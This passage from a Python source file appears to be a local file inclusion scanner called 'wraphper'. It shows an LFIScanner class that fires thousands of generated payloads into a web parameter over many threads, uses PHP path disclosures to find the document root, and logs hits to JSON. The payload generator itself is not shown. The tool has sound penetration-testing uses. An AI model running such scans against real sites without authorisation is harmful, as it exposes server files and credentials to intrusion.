        self.threads = threads
        self.method = method.upper()
        self.post_data = post_data or {}
        self.stop = False
        self.findings: List[Finding] = []
        self.tested = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.target_files = target_files
        self.target_dir = target_dir
        self.intensity = intensity
        self.output_file = output_file
        self.verbose = verbose
        self.smart_mode = smart_mode
        self.discovered_paths = set()
        self.doc_root = None
        
        signal.signal(signal.SIGINT, self._handle_stop)
    
    def _handle_stop(self, *_):
        print("\n\033[93m[!] Stopping scan...\033[0m")
        self.stop = True
    
    def get_speed(self) -> float:
        elapsed = time.time() - self.start_time
        return self.tested / elapsed if elapsed > 0 else 0
    
    def save_results(self):
        if not self.output_file:
            return
        
        try:
            results = {
                'scan_info': {
                    'total_tested': self.tested,
                    'duration': time.time() - self.start_time,
                    'findings_count': len(self.findings)
                },
                'findings': []
            }
            
            for finding in self.findings:
                results['findings'].append({
                    'type': finding.vuln_type,
                    'confidence': finding.confidence,
                    'payload': finding.payload,
                    'url': finding.url,
                    'details': finding.details,
                    'content_snippet': finding.content_snippet
                })
            
            with open(self.output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            print(f"\n\033[96m[*] Results saved to: {self.output_file}\033[0m")
        except Exception as e:
            print(f"\n\033[91m[!] Failed to save results: {str(e)}\033[0m")
    
    def scan_payload(self, url: str, param: str, payload: str):
        if self.stop:
            return
        
        try:
            safe_payload = urllib.parse.quote(payload, safe='%')
            
            if self.method == "GET":
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [safe_payload]
                
                new_query = "&".join(
                    [f"{k}={v[0]}" for k, v in query_params.items()]
                )
                full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                response = self.client.get(full_url)
            else:
                body_data = self.post_data.copy()
                body_data[param] = safe_payload
                body = "&".join(
                    [f"{k}={v}" for k, v in body_data.items()]
                )
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                full_url = url
                response = self.client.post(url, body=body, headers=headers)
            
            with self.lock:
                self.tested += 1
            
            if not response:
                return
            
            analysis = ResponseAnalyzer.analyze(
                response.text,
                dict(response.headers)
            )
            
            if self.smart_mode and analysis['details'].get('php_errors'):
                path = analysis['details']['php_errors'].get('exposed_path')
                if path and path not in self.discovered_paths:
                    self.discovered_paths.add(path)
                    if not self.doc_root and 'possible_doc_root' in analysis['details']['php_errors']:
                        self.doc_root = analysis['details']['php_errors']['possible_doc_root']
                        print(f"\n\033[94m[*] Possible document root: {self.doc_root}\033[0m")
            
            # Verbose output with content snippet
            if self.verbose:
                if analysis['confidence'] > 0.3:
                    snippet_info = ""
                    if analysis.get('content_snippet'):
                        snippet_info = f"\033[90m | Content: {analysis['content_snippet']}\033[0m"
                    
                    print(f"\n\033[90m[*] {payload[:60]} | {response.status_code} | "
                          f"{analysis['vulnerability_type']} | {analysis['confidence']:.2f}{snippet_info}\033[0m")
            
            if analysis['vulnerability_type'] and analysis['confidence'] > 0.6:
                with self.lock:
                    finding = Finding(
                        payload=payload,
                        vuln_type=analysis['vulnerability_type'],
                        confidence=analysis['confidence'],
                        details=analysis['details'],
                        url=full_url,
                        content_snippet=analysis.get('content_snippet', '')
                    )
                    self.findings.append(finding)
                    
                    color = "\033[92m" if analysis['confidence'] > 0.8 else "\033[93m"
                    snippet_str = ""
                    if finding.content_snippet:
                        snippet_str = f"\n\033[96m   Content: {finding.content_snippet}\033[0m"
                    print(f"\n{color}[+] {finding.vuln_type} -> {payload}{snippet_str}\033[0m")
        
        except Exception as e:
            if self.verbose:
                print(f"\n\033[91m[!] Error: {str(e)[:50]}\033[0m")
        
        time.sleep(self.delay)
    
    def scan(self, url: str, param: str):
        print(f"\033[96m[*] Target: {url}\033[0m")
        print(f"\033[96m[*] Parameter: {param}\033[0m")
        print(f"\033[96m[*] Threads: {self.threads}\033[0m")
        print(f"\033[96m[*] Intensity: {self.intensity}\033[0m")
        if self.smart_mode:
            print(f"\033[96m[*] Smart mode: enabled\033[0m")
        
        if self.target_dir:
            print(f"\033[96m[*] Target directory: {self.target_dir}\033[0m")
        
        if self.target_files:
            print(f"\033[96m[*] Custom files: {len(self.target_files)}\033[0m")
        
        print()
        
        payload_generator = PayloadGenerator(
            custom_files=self.target_files,
            target_dir=self.target_dir,
            intensity=self.intensity,
            smart_mode=self.smart_mode,
            doc_root=self.doc_root
        )
        
        seen = set()
        payloads = []
        for pl in payload_generator.generate():
            if pl not in seen:
                seen.add(pl)
                payloads.append(pl)
                if len(payloads) > 50000:
                    break
        
        print(f"\033[96m[*] Generated {len(payloads)} unique payloads\033[0m\n")
        
        animator = ProgressAnimator(self)
        animator.start()
        
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                for payload in payloads:
                    if self.stop:
                        break
                    
                    futures.append(
                        executor.submit(
                            self.scan_payload,
                            url,
                            param,
                            payload
                        )
                    )
                
                for future in as_completed(futures):
                    if self.stop:
                        break
        finally:
            animator.running = False
            print()
            self.summary()
            
            if self.output_file:
                self.save_results()
    
    def summary(self):
        print("\n\033[95m=== SUMMARY ===\033[0m")
        print(f"Total tested: {self.tested}")
        print(f"Findings: {len(self.findings)}")
        
        if self.findings:
            for f in self.findings:
                print(f"{f.vuln_type}: {f.payload}")
                if f.content_snippet:
                    print(f"  Content: {f.content_snippet}")
        else:
            print("\n\033[91m[-] No vulnerabilities found\033[0m")


def main():
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser()
    
    parser.add_argument("url")
    parser.add_argument("param")
    parser.add_argument("--proxy")
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--threads", type=int, default=20)
    parser.add_argument("--follow-redirects", action="store_true")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--data", help="POST data")
    parser.add_argument("--cookie", help="Session cookies")
    parser.add_argument("--header", action="append", help="Custom headers")
    parser.add_argument("--user-agent", default="wraphper/1.0", help="Custom User-Agent")
    parser.add_argument("--target-file", action="append", help="Target specific file")
    parser.add_argument("--target-dir", help="Target specific directory")
    parser.add_argument("--target-list", help="File with list of targets")
    parser.add_argument("--intensity", choices=["light", "normal", "aggressive"], default="normal")
    parser.add_argument("--output", help="Save results to JSON file")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--smart", action="store_true", help="Smart mode: use path disclosures to optimize payloads")
    
    args = parser.parse_args()
    
    Banner.show()
    
    target_files = []
    if args.target_file:
        target_files.extend(args.target_file)
    
    if args.target_list:
        try:
            with open(args.target_list, 'r') as f:
                target_files.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"\033[91m[!] File not found: {args.target_list}\033[0m")
            return
    
    if args.target_dir:
        target_files.append(args.target_dir)
    
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value
    
    client = HTTPClient(
        proxy=args.proxy,
        follow_redirects=args.follow_redirects,
        verify_ssl=not args.insecure,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout,
        user_agent=args.user_agent
    )
    
    scanner = LFIScanner(
        client,
        delay=args.delay,
        threads=args.threads,
        method=args.method,
        post_data=post_data,
        target_files=target_files if target_files else None,
        target_dir=args.target_dir,
        intensity=args.intensity,
        output_file=args.output,
        verbose=args.verbose,
        smart_mode=args.smart
    )
    
    scanner.scan(args.url, args.param)


if __name__ == "__main__":
    main()
